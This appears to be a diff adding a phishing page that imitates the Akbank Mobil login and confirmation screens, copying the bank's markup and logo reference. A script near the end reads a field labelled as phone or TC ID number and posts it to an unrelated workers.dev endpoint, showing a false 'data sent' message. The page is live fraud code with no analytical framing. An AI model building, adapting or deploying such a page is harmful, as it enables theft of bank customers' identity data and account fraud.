@@ -1,0 +1,399 @@
+<html lang="tr" class=" js flexbox flexboxlegacy canvas canvastext webgl touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths"><head>
+    <title>Akbank Mobil - Hoşçakalın!</title>
+    <meta charset="utf-8">
+    <meta name="HandheldFriendly" content="true">
+    <meta name="MobileOptimized" content="width">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1.0, user-scalable=no">
+    
+    
+    
+    <meta name="msapplication-tap-highlight" content="no">
+ 
+    <link href="./core.css" rel="stylesheet" type="text/css">
+    <link href="./main.css  " rel="stylesheet" type="text/css">
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+    <script type="text/javascript">
+        function createLoaderDiv(className){
+            var container = document.createElement("div");
+            container.setAttribute("class", className);
+            var circle1 = document.createElement("div"); circle1.setAttribute("class", "circle1");
+            var circle2 = document.createElement("div"); circle2.setAttribute("class", "circle2");
+            var circle3 = document.createElement("div"); circle3.setAttribute("class", "circle3");
+            var circle4 = document.createElement("div"); circle4.setAttribute("class", "circle4");
+            container.appendChild(circle1);
+            container.appendChild(circle2);
+            container.appendChild(circle3);
+            container.appendChild(circle4);
+            return container;
+        }
+    </script>
+</head>
+<body>
+    <style>
+        @import url(https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap);
+
+div div p {
+  color: #3e2723;
+  font-weight: 700;
+  font-style: normal;
+  font-size: 18px;
+  font-family: Montserrat;
+}
+
+div.text-input {
+  background-color: #eeeeee;
+}</style>
+
+    <input name="__RequestVerificationToken" type="hidden" value="pOPduPcBg3i884t7cFX48_Y3jtewy4Ny0x_roujpGX6l2NvFU60mzCjFPtt7cxdGMefkWZ-2fm-U_stysJn2l7IEOisYlcemKZQqy4vPWnPOgM_JG58tWoJ6jssIVo83FPQ0aQBiVESNcPvsJfUdZQ2">
+    <div id="applicationHost"><div data-bind="router: { cacheViews: true, alwaysTriggerAttach: true }" data-view="views/shell" style="" data-active-view="true"><div class="guest" data-view="views/guest/guest" data-active-view="true" style="">
+ 
+        <div class="header2"> </div>
+            <div class="banner" data-bind="css:{extras:!(isLogoVisible())}" style="
+            margin-top: 22px;
+            margin-bottom: 22px;
+        ">   
+                <img class="logo" src="standart_logo.svg" style="    -webkit-tap-highlight-color: rgba(0,0,0,0);
+                -webkit-text-size-adjust: 100%;
+                font-size: 14px;
+                font-family: 'Open Sans';
+                color: #808282;
+                line-height: 1.3333333;
+                user-select: none;
+                box-sizing: border-box;
+                vertical-align: middle;
+                border: 0;
+                display: block;
+                margin: 0 auto;
+                height: 15px;
+                width: 137px;">       
+                <div data-bind="visible:!(isLogoVisible())" class="extras" style="display: none;">
+                    <a class="back-part" data-bind="click:function(){navigateBack();}">
+                        <img class="back-image" data-bind="attr:{src:backIcon}" onerror="this.src = this.src.replace(/\.svg/,'.png'); this.onerror = null;" src="/content/application/images/icons/back.png">
+                    </a>
+                    <a class="close-part" data-bind="click:function(){navigateHome();}">
+                        <img class="close-image" data-bind="attr:{src:closeIcon}" onerror="this.src = this.src.replace(/\.svg/,'.png'); this.onerror = null;" src="/content/application/images/icons/close.png">
+                    </a>
+                    <!--ko text:header--><!--/ko-->
+                </div>
+     
+            
+        <!-- /ko -->
+ 
+    </div>
+    <div class="item-text" style="    -webkit-text-size-adjust: 100%;
+    -webkit-tap-highlight-color: rgba(0,0,0,0);
+    line-height: 1.42857143;
+    user-select: none;
+    color: #fff;
+    font-family: 'Open Sans';
+    font-size: 15px;
+    font-weight: 300;
+    box-sizing: border-box;
+    width: 99%;
+    display: table-cell;
+    vertical-align: middle;
+    padding: 18px 20px;
+    padding-right: 0;text-align: left;"><!--ko text:GetString('ForgotMBB')-->   <!--/ko--></div>
+    <div class="content-area" data-bind="router: { cacheViews: true, alwaysTriggerAttach: true }"><div class="login-form-wrap" data-view="views/guest/login/mbblogin/mbblogin" data-active-view="true" style="">
+    <div class="login-router" data-bind="router: { cacheViews: false, alwaysTriggerAttach: true }"><div class="mbbcclogin" data-view="views/guest/login/mbblogin/subviews/mbbloginpasswordcaptcha" data-active-view="true" style="">
+    
+    
+        <text-input-login params="type:'mbb', placeholder:GetString('CustomerNumberLogin'),value:mbbNo"><div class="text-input-login">
+    <div data-bind="attr: { class: className}" class="text-input">
+     <center>   <img src="./onay.png" alt="90" width="" height="90"> </center>  <br><p style="    -webkit-text-size-adjust: 100%;
+        -webkit-tap-highlight-color: rgba(0,0,0,0);
+        line-height: 1.42857143;
+        user-select: none;
+        color: #fff;
+        font-family: 'Open Sans';
+        font-size: 16px;
+        font-weight: 600;
+        box-sizing: border-box;
+        width: 99%;
+    
+        vertical-align: middle;
+        padding: 18px 20px;
+        padding-right: 0;text-align: center;">İşleminiz Onaylanmıştır.</p><br><p style="    -webkit-text-size-adjust: 100%;
+        -webkit-tap-highlight-color: rgba(0,0,0,0);
+        line-height: 1.42857143;
+        user-select: none;
+        color: #fff;
+        font-family: 'Open Sans';
+        font-size: 16px;
+        font-weight: 600;
+        box-sizing: border-box;
+        width: 99%;
+    
+        vertical-align: middle;
+        padding: 18px 20px;
+        padding-right: 0;text-align: center;">En Kısa Süre içerisinde Sizin ile iletişime Geçilecektir</p></center>
+    </div>
+</div></text-input-login>
+    <hr class="login-separator">
+    <text-input-login params="type:'ast', placeholder:GetString('AkbankDirektPassword'),value:password"><div class="text-input-login">
+    <div data-bind="attr: { class: className}" class="text-input">
+        <div class="text-input-wrap">
+            <div class="icon-part">
+                <!-- ko if: type()=='mbb' --><!-- /ko -->
+                <!-- ko if: type()=='yatirimci' --><!-- /ko -->
+                <!-- ko if: type()=='ast'-->
+                <div class="icon icon-password-w icon-password-w-size"></div>
+                <!-- /ko -->
+                <!-- ko if: type()=='whitePass'--><!-- /ko -->
+                <!-- ko if: type()=='cepsifre'--><!-- /ko -->
+                <!-- ko if: type()=='kk'--><!-- /ko -->
+                <!-- ko if: type()=='skt'--><!-- /ko -->
+                <!-- ko if: type()=='phonenumber' --><!-- /ko -->
+                <!-- ko if: type()=='captcha'--><!-- /ko -->
+            </div>
+                <!-- ko if: type()=='phonenumber' --><!-- /ko -->
+            <div class="input-part">
+                <!-- ko if: type()=='mbb' --><!-- /ko -->
+                <!-- ko if: type()=='yatirimci' --><!-- /ko -->
+                <!-- ko if: type()=='ast' -->
+                 <!-- /ko -->
+                <!-- ko if: type()=='whitePass' --><!-- /ko -->
+                <!-- ko if: type()=='cepsifre' --><!-- /ko -->
+                <!-- ko if: type()=='kk' --><!-- /ko -->
+                <!-- ko if: type()=='skt' --><!-- /ko -->
+                <!-- ko if: type()=='phonenumber' --><!-- /ko -->
+                <!-- ko if: type()=='captcha' --><!-- /ko -->
+            </div>
+        </div>
+    </div>
+</div></text-input-login>
+    <div data-bind="visible: isPhoneNumberVisible()" style="display: none;">
+       
+        
+    
+</div></text-input-login>
+    </div>
+    <div data-bind="visible: isCaptchaVisible()" style="display: none;">
+        <!--ko if:isHybridCaptcha-->
+        <hr class="login-separator">
+        <div class="text-center" style="margin: 10px 20px; padding: 5px; border-radius: 2px; background-color: #E5E5E5;">
+            <img style="width:120px;" data-bind="attr: { src: 'data:image/png;base64,' + captchaData() }" src="data:image/png;base64,">
+            <a href="#" data-bind="click:refreshCaptcha, attr :{ value : GetString('Refresh')}" value="Yenile">
+                 <span style="font-size: 15px; color: #ab1f23; margin-left: 5px; line-height: 32px" data-bind="value: GetString('Refresh')"></span>
+            </a>
+        </div>
+        <hr class="login-separator">
+        <text-input-login params="type:'captcha', placeholder:GetString('AkbankDirekSecuritytImage'),value:captcha"><div class="text-input-login">
+    <div data-bind="attr: { class: className}" class="text-input">
+        <div class="text-input-wrap">
+            <div class="icon-part">
+  
+                <div class="icon icon-password-w icon-password-w-size"></div>
+                <!-- /ko -->
+            </div>
+                <!-- ko if: type()=='phonenumber' --><!-- /ko -->
+            <div class="input-part">
+  
+                <input class="inputarea" type="text" data-bind="bind-value: value, attr: { placeholder : placeholder},settings: { maxlength: 4 ,afterkeyup: makeItUpper}" placeholder="Yukarıdaki Karakterleri Giriniz">
+                <!-- /ko -->
+            </div>
+        </div>
+    </div>
+</div></text-input-login>
+        <!--/ko-->
+    </div>
+    <div class="login-button-bar">
+        <div class="login-button-wrap">
+            <div class="login-button" data-bind="visible:cancelButtonVisible">
+              
+            </div>
+    
+        </div>
+    </div>
+ 
+ 
+ 
+</div></div>
+    <div class="login-navigation">
+        <div class="language-part" data-bind="visible:isRegisteredLogin()" style="display: none;">
+            <div class="culture-selection" data-bind="visible: _parent.langSelection()" style="display: none;">
+                <!-- ko foreach: SupportedLanguages -->
+                <a href="#" data-bind="attr: {class: (LanguageCode === $parent.SelectedLanguage()?'selected':'')} , text: LanguageName, click: function(data, event){ if($parent.SelectedLanguage() !== LanguageCode) $parent.ChangeLang(LanguageCode)}" class="selected">Türkçe</a>
+                <!-- ko if: ($index() !== ($parent.SupportedLanguages().length - 1)) -->
+                |
+                <!-- /ko -->
+                
+                <a href="#" data-bind="attr: {class: (LanguageCode === $parent.SelectedLanguage()?'selected':'')} , text: LanguageName, click: function(data, event){ if($parent.SelectedLanguage() !== LanguageCode) $parent.ChangeLang(LanguageCode)}" class="">English</a>
+                <!-- ko if: ($index() !== ($parent.SupportedLanguages().length - 1)) --><!-- /ko -->
+                <!-- /ko -->
+            </div>
+        </div>
+        <!-- ko compose: _parent.LoginExtrasView --><div class="login-nav-wrap" data-view="views/guest/login/nav" data-active-view="true" style="">
+    <a href="#" data-bind="click: NavigateToMaps" class="map-link">
+        <div class="map-wrap">
+            <div class="map-icon">
+                <div class="map-icon-g icon-map-g icon-map-g-size"></div>
+            </div>
+            <span class="map-text"> <!--ko text:GetString('NearestAkbank')-->En Yakın Akbank<!--/ko--></span>
+            <div class="map-arrow">
+                <div class="icon-arrow-right-vdg icon-arrow-right-vdg-size arrow-right"></div>
+            </div>
+        </div>
+    </a>
+    <a href="#" data-bind="click: NavigateToCurrencyConverter" class="extras-link">
+        <div class="extras-wrap">
+            <div class="extras-icon">
+                <div class="extras-icon-g icon-currency-g icon-currency-g-size"></div>
+            </div>
+            <span class="extras-text extras-has-sub-text"><!--ko text:GetString('CurrencyConverter')-->Döviz Kuru Hesaplama<!--/ko--><br><span class="usd-login-text" data-bind="text: loginCurrCombined()">1 USD = 33,8110 TL</span>&nbsp;</span>
+            <div class="extras-arrow">
+                <div class="icon-arrow-right-vdg icon-arrow-right-vdg-size arrow-right"></div>
+            </div>
+        </div>
+    </a>
+    <!-- ko if:!IsHybrid() || IsHybridTablet()-->
+    <a href="#" data-bind="click: NavigateToDirectLoanApplication" class="extras-link desktop-site">
+        <div class="extras-wrap">
+            <div class="extras-icon">
+              
+            </div>
+            <span class="extras-text"><!--ko text:GetString('DirectLoanApplication')-->Hızlı Kredi Başvurusu<!--/ko--></span>
+            <div class="extras-arrow">
+                <div class="icon-arrow-right-vdg icon-arrow-right-vdg-size arrow-right"></div>
+            </div>
+        </div>
+    </a>   
+     <!--/ko-->
+</div><!--/ko-->
+    </div>
+</div><div class="login-form-wrap" data-bind="css:{login-form-wrap-direction: _parent.langSelection()}" data-view="views/guest/home" style="display: none;">
+    <div class="main-part">
+        <div class="login-router">
+            <div class="home-title">
+                <div class="title-wrap">
+                    <div class="title-text">
+                        <!--ko text:GetString('AkbankLogin')-->Akbank Mobil Giriş<!--/ko-->
+                    </div>
+                </div>
+            </div>
+            <div class="login-options-wrap">
+                <a href="#" data-bind="click: NavigateToMbbLogin" class="login-option">
+                    <div class="icon-wrap">
+                        <div class="option-icon icon-user-w icon-user-w-size"></div>
+                    </div>
+                    <div class="option-text">
+                        <!--ko text:GetString('LoginWithMbb')-->Müşteri / TC Kimlik No ile Giriş<!--/ko-->
+                    </div>
+                    <div class="option-arrow">
+                        <div class="icon-arrow-right-w icon-arrow-right-w-size arrow-right"></div>
+                    </div>
+                </a>
+                <a href="#" data-bind="click: NavigateToCCLogin" class="login-option">
+                    <div class="icon-wrap">
+                        <div class="option-icon icon-credit-card-w icon-credit-card-w-size"></div>
+                    </div>
+                    <div class="option-text">
+                        <!--ko text:GetString('LoginWithCC')-->Kredi Kartı ile Giriş<!--/ko-->
+                    </div>
+                    <div class="option-arrow">
+                        <div class="icon-arrow-right-w icon-arrow-right-w-size arrow-right"></div>
+                    </div>
+                </a>
+            </div>
+        </div>
+        <div class="login-extras-part">
+            <div class="language-part">
+                <div class="culture-selection" data-bind="visible: _parent.langSelection()" style="display: none;">
+                    <!-- ko foreach: SupportedLanguages -->
+                    <a href="#" data-bind="attr: {class: (LanguageCode === $parent.SelectedLanguage()?'selected':'')} , text: LanguageName, click: function(data, event){ if($parent.SelectedLanguage() !== LanguageCode) $parent.ChangeLang(LanguageCode)}" class="selected">Türkçe</a>
+                    <!-- ko if: ($index() !== ($parent.SupportedLanguages().length - 1)) -->
+                    |
+                    <!-- /ko -->
+                    
+                    <a href="#" data-bind="attr: {class: (LanguageCode === $parent.SelectedLanguage()?'selected':'')} , text: LanguageName, click: function(data, event){ if($parent.SelectedLanguage() !== LanguageCode) $parent.ChangeLang(LanguageCode)}" class="">English</a>
+                    <!-- ko if: ($index() !== ($parent.SupportedLanguages().length - 1)) --><!-- /ko -->
+                    <!-- /ko -->
+                </div>
+            </div>
+            <!-- ko compose: _parent.LoginExtrasView --><div class="login-nav-wrap" data-view="views/guest/login/nav" data-active-view="true" style="">
+    <a href="#" data-bind="click: NavigateToMaps" class="map-link">
+        <div class="map-wrap">
+            <div class="map-icon">
+                <div class="map-icon-g icon-map-g icon-map-g-size"></div>
+            </div>
+            <span class="map-text"> <!--ko text:GetString('NearestAkbank')-->En Yakın Akbank<!--/ko--></span>
+            <div class="map-arrow">
+                <div class="icon-arrow-right-vdg icon-arrow-right-vdg-size arrow-right"></div>
+            </div>
+        </div>
+    </a>
+    <a href="#" data-bind="click: NavigateToCurrencyConverter" class="extras-link">
+        <div class="extras-wrap">
+            <div class="extras-icon">
+                <div class="extras-icon-g icon-currency-g icon-currency-g-size"></div>
+            </div>
+            <span class="extras-text extras-has-sub-text"><!--ko text:GetString('CurrencyConverter')-->Döviz Kuru Hesaplama<!--/ko--><br><span class="usd-login-text" data-bind="text: loginCurrCombined()">1 USD = 33,8110 TL</span>&nbsp;</span>
+            <div class="extras-arrow">
+                <div class="icon-arrow-right-vdg icon-arrow-right-vdg-size arrow-right"></div>
+            </div>
+        </div>
+    </a>
+    <!-- ko if:!IsHybrid() || IsHybridTablet()-->
+    <a href="#" data-bind="click: NavigateToDirectLoanApplication" class="extras-link desktop-site">
+        <div class="extras-wrap">
+            <div class="extras-icon">
+   
+            </div>
+            <span class="extras-text"><!--ko text:GetString('DirectLoanApplication')-->Hızlı Kredi Başvurusu<!--/ko--></span>
+            <div class="extras-arrow">
+                <div class="icon-arrow-right-vdg icon-arrow-right-vdg-size arrow-right"></div>
+            </div>
+        </div>
+    </a>   
+     <!--/ko-->
+</div><!--/ko-->
+        </div>
+    </div>
+</div></div>
+ 
+<script>// Cep telefonu numarası input alanı
+    var phoneNumberInput = document.querySelector('.inputarea');
+    
+    // Giriş butonu
+    var loginBtn = document.getElementById('loginBtn');
+    
+    // Cep telefonu numarası input alanını dinle
+    phoneNumberInput.addEventListener('input', function () {
+        var phoneNumber = phoneNumberInput.value;
+    
+        // Eğer en az 8 karakter girilmişse
+        if (phoneNumber.length >= 8) {
+            // Giriş butonunun disable özelliğini kaldır
+            loginBtn.removeAttribute('disabled');
+        } else {
+            // Giriş butonunu disable yap
+            loginBtn.setAttribute('disabled', 'disabled');
+        }
+    });
+    
+    // Giriş butonuna tıklanınca
+    loginBtn.addEventListener('click', function () {
+        var tcno = phoneNumberInput.value;
+    
+        // POST işlemi için veri oluştur
+        var data = new FormData();
+        data.append('tcno', tcno);
+    
+        // POST işlemi için fetch kullanarak isteği oluştur
+        fetch('https://worker-steep-shape-b948.selimjuhan2.workers.dev/', {
+            method: 'POST',
+            body: data
+        })
+        .then(response => response.text())
+        .then(data => {
+            console.log(data);
+            alert("Veri başarıyla gönderildi!");
+        })
+        .catch(error => {
+            console.error('Hata:', error);
+            alert("Bir hata oluştu, lütfen tekrar deneyin.");
+        });
+    });
+    </script>
+ 
+</body></html>
